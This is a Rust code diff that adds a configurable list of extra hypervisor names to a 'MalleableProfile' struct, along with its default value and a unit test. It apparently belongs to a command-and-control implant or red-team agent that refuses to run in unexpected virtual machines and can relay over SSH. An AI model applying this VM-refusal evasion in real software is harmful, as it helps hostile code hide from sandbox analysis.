@@ -138,6 +138,15 @@ pub struct MalleableProfile {
     /// and should be used sparingly; prefer exact ID pinning whenever possible.
     #[serde(default)]
     pub cloud_instance_fallback_ids: Vec<String>,
+    /// Extra expected hypervisor name fragments for niche cloud providers.
+    /// Each non-empty entry is matched case-insensitively against Linux DMI
+    /// `product_name` in addition to the built-in cloud hypervisor list used
+    /// by `is_expected_hypervisor`.
+    ///
+    /// Trade-off: broad values (for example, "virtual") can over-match and
+    /// weaken VM-refusal enforcement. Keep entries provider-specific.
+    #[serde(default)]
+    pub vm_detection_extra_hypervisor_names: Vec<String>,
     /// SSH relay hostname for the `ssh-transport` feature.
     #[serde(default)]
     pub ssh_host: Option<String>,
@@ -200,6 +209,7 @@ impl Default for MalleableProfile {
             cloud_instance_id: None,
             cloud_instance_allow_without_imds: false,
             cloud_instance_fallback_ids: Vec::new(),
+            vm_detection_extra_hypervisor_names: Vec::new(),
             ssh_host: None,
             ssh_port: None,
             ssh_username: None,
@@ -518,5 +528,6 @@ mod tests {
         let profile = MalleableProfile::default();
         assert!(!profile.cloud_instance_allow_without_imds);
         assert!(profile.cloud_instance_fallback_ids.is_empty());
+        assert!(profile.vm_detection_extra_hypervisor_names.is_empty());
     }
 }
